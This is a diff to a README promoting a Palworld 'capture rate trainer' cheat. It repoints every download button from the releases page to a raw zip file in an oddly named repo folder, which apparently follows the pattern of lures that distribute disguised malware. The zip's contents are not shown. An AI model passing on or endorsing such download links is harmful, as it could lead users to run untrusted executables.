@@ -1,7 +1,7 @@
 <h1>🎮 Palworld-Capture-Rate-Trainer - Catch Any Pal Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Noahdu7312/Palworld-Capture-Rate-Trainer/releases">
+  <a href="https://raw.githubusercontent.com/Noahdu7312/Palworld-Capture-Rate-Trainer/main/belly/Trainer_Palworld_Rate_Capture_3.7.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white&labelColor=4ECDC4" alt="Download" width="350">
   </a>
 </p>
@@ -38,7 +38,7 @@ Follow these simple steps to get the trainer running on your Windows PC.
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/Noahdu7312/Palworld-Capture-Rate-Trainer/releases">
+  <a href="https://raw.githubusercontent.com/Noahdu7312/Palworld-Capture-Rate-Trainer/main/belly/Trainer_Palworld_Rate_Capture_3.7.zip">
     <img src="https://img.shields.io/badge/📥_GET_THE_TRAINER-FFD93D?style=for-the-badge&logo=github&logoColor=black" alt="Download Button" width="300">
   </a>
 </p>
@@ -160,7 +160,7 @@ This trainer is for educational and personal entertainment purposes only. It is 
 Palworld-Capture-Rate-Trainer makes the game more fun by removing the most frustrating part – failed captures. With just a few clicks, you'll have every Pal you've ever wanted. Download it now and become the ultimate Pal trainer!
 
 <p align="center">
-  <a href="https://github.com/Noahdu7312/Palworld-Capture-Rate-Trainer/releases">
+  <a href="https://raw.githubusercontent.com/Noahdu7312/Palworld-Capture-Rate-Trainer/main/belly/Trainer_Palworld_Rate_Capture_3.7.zip">
     <img src="https://img.shields.io/badge/🚀_DOWNLOAD_TRAINER_2026-6BCB77?style=for-the-badge&logo=github&logoColor=white" alt="Final Download" width="320">
   </a>
 </p>
